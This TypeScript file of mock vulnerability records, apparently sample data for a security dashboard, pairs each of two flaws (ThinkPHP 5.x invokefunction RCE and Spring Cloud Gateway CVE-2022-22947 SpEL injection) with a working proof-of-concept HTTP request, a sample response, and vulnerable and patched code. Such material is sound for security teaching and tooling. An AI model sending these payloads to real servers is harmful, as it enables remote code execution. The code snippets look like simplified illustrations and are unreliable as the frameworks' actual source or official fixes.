export interface MockVulnerability {
  id: string;
  name: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  path: string;
  description: string;
  pocRequest: string;
  pocResponse: string;
  vulnCode: string;
  patchedCode: string;
}

export const mockVulnerabilityList: MockVulnerability[] = [
  {
    id: "VULN-2026-0012",
    name: "ThinkPHP 5.x Remote Code Execution (RCE)",
    severity: "CRITICAL",
    path: "/public/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami",
    description: "A critical remote code execution vulnerability exists in the ThinkPHP 5.x framework's controller handling logic. Because the framework does not strictly filter input parameters used to invoke internal modules, a remote, unauthenticated attacker can exploit parameter binding variables to execute arbitrary PHP system calls via invokefunction injection.",
    pocRequest: `GET /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami HTTP/1.1\r
Host: target-server.local\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r
Accept: */*\r
Connection: close\r
Cookie: PHPSESSID=mock_session_key_for_telemetry`,
    pocResponse: `HTTP/1.1 200 OK\r
Server: nginx/1.18.0\r
Content-Type: text/html; charset=utf-8\r
Connection: close\r
Content-Length: 14\r
\r
www-data`,
    vulnCode: `// Vulnerable Controller: thinkphp/library/think/App.php (Line ~330)
public function exec($dispatch, $config)
{
    // ...
    // DIRECTLY binding user input to class namespace reflection
    $class  = $dispatch['controller'];
    $action = $dispatch['action'];
    
    // Unrestricted dynamic instantiation leading to arbitrary code execution
    $instance = Container::get($class);
    $data     = $this->invokeMethod([$instance, $action], $vars);
    
    return $data;
}`,
    patchedCode: `// Patched Controller: thinkphp/library/think/App.php (Line ~330)
public function exec($dispatch, $config)
{
    // ...
    $class  = $dispatch['controller'];
    $action = $dispatch['action'];

    // SECURITY PATCH: Strict white-list validation on controller namespace paths
    // Prevent resolution of namespaced libraries outside user controller scope
    if (strpos($class, '\\\\') !== false || strpos($class, '/') !== false) {
        throw new \\think\\exception\\HttpException(403, 'Access Denied: Dangerous controller namespace!');
    }
    
    // Ensure the resolved controller class actually inherits the base Controller
    $instance = Container::get($class);
    if (!($instance instanceof \\think\\Controller)) {
         throw new \\think\\exception\\HttpException(403, 'Access Denied: Target is not a valid controller.');
    }
    
    $data = $this->invokeMethod([$instance, $action], $vars);
    return $data;
}`
  },
  {
    id: "VULN-2026-0043",
    name: "Spring Cloud Gateway Remote Code Execution (CVE-2022-22947)",
    severity: "HIGH",
    path: "/actuator/gateway/routes/hack_route",
    description: "An unauthenticated remote attacker can exploit a SpEL (Spring Expression Language) injection vulnerability in the gateway routing configuration endpoints to execute arbitrary system code on the host machine via malicious routing filters.",
    pocRequest: `POST /actuator/gateway/routes/hack_route HTTP/1.1\r
Host: gateway-server.local\r
Content-Type: application/json\r
Connection: close\r
\r
{\n  "id": "hack_route",\n  "filters": [{\n    "name": "AddResponseHeader",\n    "args": {\n      "name": "Result",\n      "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\"id\\").getInputStream()))}"\n    }\n  }],\n  "uri": "http://example.com"\n}`,
    pocResponse: `HTTP/1.1 201 Created\r
Content-Type: application/json\r
Connection: close\r
Content-Length: 0`,
    vulnCode: `// Vulnerable Filter Resolver: GatewayFilterFactory.java
public GatewayFilter apply(C config) {
    // Evaluating string expressions directly through SpEL parser without safety context
    Expression expression = this.parser.parseExpression(config.getValue());
    String evaluated = expression.getValue(this.evaluationContext, String.class);
    
    return (exchange, chain) -> {
        exchange.getResponse().getHeaders().add(config.getName(), evaluated);
        return chain.filter(exchange);
    };
}`,
    patchedCode: `// Patched Filter Resolver: GatewayFilterFactory.java
public GatewayFilter apply(C config) {
    // SECURITY PATCH: Use SimpleEvaluationContext which disables arbitrary constructor calls
    // Prevents dynamic class generation, system exec runs, and runtime instantiation
    SimpleEvaluationContext secureContext = SimpleEvaluationContext.forReadWriteDataBinding().build();
    
    Expression expression = this.parser.parseExpression(config.getValue());
    String evaluated = expression.getValue(secureContext, String.class);
    
    return (exchange, chain) -> {
        exchange.getResponse().getHeaders().add(config.getName(), evaluated);
        return chain.filter(exchange);
    };
}`
  }
];
